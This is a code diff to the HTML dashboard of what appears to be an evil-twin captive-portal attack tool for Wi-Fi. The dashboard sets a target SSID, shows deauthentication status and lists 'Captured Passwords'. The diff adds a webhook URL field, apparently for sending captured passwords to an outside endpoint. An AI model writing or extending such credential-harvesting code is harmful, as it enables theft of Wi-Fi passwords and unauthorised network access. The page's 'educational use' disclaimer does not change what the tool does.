@@ -14,7 +14,7 @@ String signalColor(const int strength){
   if(strength <= -80){ return "red"; }
 }
 
-String dashboard(const String& indexLang, const String& favicon, const String& currentSSID, const String& allPass, const int numNetworks, const bool validation, const bool deauthing){
+String dashboard(const String& indexLang, const String& favicon, const String& currentSSID, const String& allPass, const int numNetworks, const bool validation, const bool deauthing, const String& webhookurl){
   char acColor[8] = "#ff0003"; //defines the color of the accent stripes on the <h1> lines on the dashboard
 
   String _html;
@@ -116,7 +116,7 @@ String dashboard(const String& indexLang, const String& favicon, const String& c
   _html += "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px;'>Captive Portal Dashboard</h1>";
 
   _html += "<p><span style='color: red;'>INFO:<br></span><span style='color: red; font-size: 16px;'>- ! ! ! ONLY FOR EDUCATIONAL USE, USING IT ON DEVICES OR NETWORKS YOU DO HAVE PERMISSION TO  IS ILLEGAL AND WILL GET YOU IN TROUBLE ! ! !<br></span>";
-  _html += "<span>- Credits to: Spacehuhn, adamff-dev, sankethj and justcallmekoko their projects helped me understand things and without the knowlege that I have gained form their projects this would probably wouldn't work<br>- Made by HEINZGUENTER</span></p>";
+  _html += "<span>- Credits to: Spacehuhn, adamff-dev, sankethj and justcallmekoko their projects helped me understand things and without the knowlege that I have gained form their projects this would probably wouldn't work<br>- to disable the webhook submit a blank field<br>- Made by HEINZGUENTER</span></p>";
 
   _html += "<div><h1>Settings</h1><div class='button-container'>";
   _html += "<h2>Language:</h2>";
@@ -129,7 +129,7 @@ String dashboard(const String& indexLang, const String& favicon, const String& c
 
   //SSID part on the website  
   _html += "<div class='button-container'><h2>TargetSSID:</h2>";
-  _html += "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'></input><input type=submit value='Change SSID'></form>";
+  _html += "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'><input type=submit value='Change SSID'></form>";
   _html += "</div><hr class='spacer'>";
 
   _html += "<div class='button-container'><h2>Password validation:</h2>";
@@ -140,7 +140,11 @@ String dashboard(const String& indexLang, const String& favicon, const String& c
   else { _html += "<option value='on'>On</option><option selected value='off'>Off</option>"; }
 
   _html += "</select><input type='submit' value='Enter'>";
-  _html += "</form></div></div>";
+  _html += "</form></div></div><hr class='spacer'>";
+
+  _html += "<div class='button-container'><h2>WebHook:</h2>";
+  _html += "<form action='/webhook'><input value='"+ webhookurl +"' type=text placeholder='WebHook Url' name=url><input type=submit value='Change Url'></form>";
+  _html += "</div>";
   
   _html += "<div><div class='button-container'><h1 style='padding-right: 112px;'>Captured Passwords</h1>";
   _html += "<form style='display:inline-block;' method='post' action='/clearPass'><button style='display:inline-block;'>Delete Passwords</button></form>";
